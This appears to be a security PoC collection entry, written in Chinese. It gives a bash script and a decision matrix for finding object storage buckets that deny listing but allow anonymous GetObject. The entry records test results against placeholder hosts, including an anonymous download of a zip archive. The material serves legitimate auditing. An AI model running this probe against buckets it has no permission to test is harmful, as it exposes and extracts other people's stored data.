# 对象存储桶 ListBucket 拒绝但 GetObject 放行：匿名读取判定矩阵（403 错误体语义区分 桶私有/桶不存在/键不存在）

- **code**: oss-listbucket-denied-getobject-allowed-anon-read-matrix
- **kind**: script
- **category**: info-leak
- **component**: 阿里云 OSS / 又拍云 USS（S3 兼容对象存储）
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-03 task#612 实测（Windows 执行机，curl.exe --noproxy '*' 只读单发）：① 三桶 ListBucket 全部 403，但错误体可区分——target501.example.com 回 403/277B "requester: GRPS000000ANONYMOUSE, does not have READ permission on bucket: qzyun"（桶存在、禁列），target502.example.com 回 403/378B EC 0003-00000002。② 对象级分叉决定性：随机键 GET target500.example.com/zzqx7k2m9p4t8v3n1w6y.png → 404 <Code>NoSuchKey</Code>（证明 GetObject 已放行，只是键不存在），而 sub2 同法回 403 "You have no right to access this object because of bucket acl."（对象级也私有）。③ 匿名取真对象：GET dmm8 .../192.1.2-x64.zip 带 Range bytes=0-1023 → 206/1024B/application/zip，首 4 字节 50 4B 03 04，HEAD Content-Length: 21983650，整包 200 下载 21,983,650B 成功；GET qzyun/512.png → 200/32280B image/png（/192.png、/logo.svg、/favicon.ico 同 200）。故判定：两桶对象级匿名可读成立，sub2 对象级私有。
- **path**: pocs/oss-listbucket-denied-getobject-allowed-anon-read-matrix/poc.sh
- **tags**: 对象存储,OSS,又拍云,S3,GetObject,ListBucket,AccessDenied,NoSuchKey,匿名读,信息泄露,无凭据,判据矩阵
- **created_at**: 2026-11-02T21:00:44.487Z
- **engine**: https://target500.example.com/ ; https://target501.example.com/

## 描述

对象存储桶判定。核心判据纠正：ListBucket 返回 403 完全不代表桶不能让匿名读——必须再打一个随机键：回 404 NoSuchKey = GetObject 已放行（桶可匿名取对象，只是不可枚举）；回 403 + bucket acl 字样 = 对象级也私有。三种 403 错误体（桶不属于你 / 无 READ permission / bucket acl）用于区分桶存在性与权限层，避免把"桶私有"误判成"桶不存在"而放弃。前提：得先有真实对象键，可从站点页面 href / status 接口 logo 字段取得。

## 用法

```
BUCKET=https://<bucket>.<region>.target499.example.com bash oss_anon_read_probe.sh
1) 第一段打 ListBucket 并读错误体：403 记下 "桶存在"；回 NoSuchBucket 才是桶不存在。
2) 第二段打随机键：404 NoSuchKey ⇒ 对象级匿名可读成立（继续第三步）；403 + bucket acl ⇒ 对象级私有，收手。
3) 第三段对真实键取 HEAD + Range 0-1023 双证据：200/206 + 正确 Content-Type + 文件头魔数（zip=50 4B 03 04、png=89 50 4E 47）才算实锤。
真实键来源：目标页面 href、/api/status 之类配置接口的 logo/icon 字段、前端 bundle 里的静态资源绝对 URL。
注意：本机有 HTTP 代理时必须 --noproxy '*'，否则 403/超时全是代理造成的假阴性。
```

## 正文

```
#!/usr/bin/env bash
# 对象存储匿名读判定：ListBucket 被拒 ≠ 不可读；必须做「随机键」对象级分叉
# 用法：BUCKET=https://target500.example.com bash oss_anon_read_probe.sh
#      已知键用 REALKEY 传入，多个用空格
set -u
BUCKET="${BUCKET:?set BUCKET=https://<bucket>.<region>.endpoint}"
REALKEY="${REALKEY:-}"
C="curl -sS --noproxy * --max-time 20"
RAND="zz$(date +%s | md5sum | cut -c1-16).png"

echo "=== [1] ListBucket：403 的正文才是信息，别只看状态码 ==="
BODY=$($C "$BUCKET/?list-type=2&max-keys=1000")
CODE=$($C -o /dev/null -w '%{http_code}' "$BUCKET/?list-type=2&max-keys=1000")
echo "HTTP $CODE"
echo "$BODY" | head -c 400; echo
case "$BODY" in
  *NoSuchBucket*) echo "  => 桶不存在，换桶名" ;;
  *ListBucketResult*) echo "  => 桶可列举！直接枚举 <Key>" ;;
  *AccessDenied*|*ACL*|*permission*|*acl*)
      echo "  => 桶存在、匿名禁列（属正常）；**继续第 2 步判断对象级**" ;;
  *) echo "  => 非标准回显，人工判断" ;;
esac

echo "=== [2] 对象级分叉（决定性判据）==="
B2=$($C -o /dev/null -w '%{http_code}' "$BUCKET/$RAND" -D /tmp/h2); H2=$(head -c 300 /tmp/h2)
echo "GET /$RAND -> HTTP $B2"
case "$B2" in
  404) echo "  => NoSuchKey：GetObject 已放行，桶可匿名取对象（不可枚举而已）" ;;
  403) echo "  => 对象级也私有（bucket acl）。看正文是否含 'bucket acl' 佐证" ;;
  200) echo "  => 命中同名对象（换更长的随机名重测）" ;;
esac
[ "$B2" = "403" ] && { echo "  body:"; echo "$B2$H2" | head -c 400; echo; }

echo "=== [3] 真实键取证：HEAD 长度 + Range 首片 + 魔数 ==="
for K in $REALKEY; do
  echo "--- $K"
  $C -I "$BUCKET/$K" | egrep -i 'HTTP/|content-length|content-type'
  $C -r 0-1023 -o /tmp/head.bin -D /tmp/h3 "$BUCKET/$K"
  egrep -i 'HTTP/|content-type|content-range' /tmp/h3
  echo -n "  magic: "; xxd -l 8 /tmp/head.bin 2>/dev/null | cut -d' ' -f2-5
done
# 判据：200/206 + 正确 Content-Type + 魔数吻合（zip 504b0304 / png 89504e47 / jpg ffd8ff）= 实锤匿名读

```
